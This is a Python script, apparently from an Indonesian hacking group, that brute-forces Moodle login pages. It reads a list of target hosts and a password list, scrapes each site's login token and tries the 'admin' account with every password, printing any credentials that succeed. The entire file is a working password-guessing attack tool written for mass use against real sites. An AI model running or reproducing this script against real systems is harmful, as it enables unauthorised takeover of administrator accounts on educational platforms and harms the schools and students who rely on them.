import requests,re, sys
from bs4 import BeautifulSoup as bs4

user = "admin" #user default
sess = requests.Session()

def banner():
    print("""
    ..................  | Author : FilthyRoot
    . Moodle Bruter! .  | Github : @soracyberteam
    ..................  | Copyright (c) 2020 Jogjakarta Hacker Link
    """)

def get_token(target):
    r = sess.get("http://" + target + "/login/index.php")
    s = bs4(r.text, "html.parser").find("input", attrs={'name': 'logintoken'})
    return s.get("value")

def login_moodle(target, user, passwd,token):
    data = {
        'logintoken': token,
        'username': user,
        'password': passwd,
    }
    r = sess.post("http://" + target + "/login/index.php", data = data)
    if re.search("loginerrormessage", r.text) or re.search("Anda belum login.", r.text):
        return False
    else:
        return True

banner()
if len(sys.argv) < 2:
    print("Usage : python moodle.py target.txt\nNote : target list without http://")
else:
    pwx = open("pass.txt", "r")
    lists = pwx.read().split("\n") #load pass list
    f = open(sys.argv[1], "r")
    x = f.read().split("\n")
    for i in x:
        print("[*] Checking " + i + "...")
        for pw in lists:
            try:
            	if login_moodle(i, user, pw, get_token(i)):
                	print("[+] Found => " + user + ":" + pw)
                	exit()
            	else:
                	print("[x] " + user + ":" + pw)
            except:
                pass

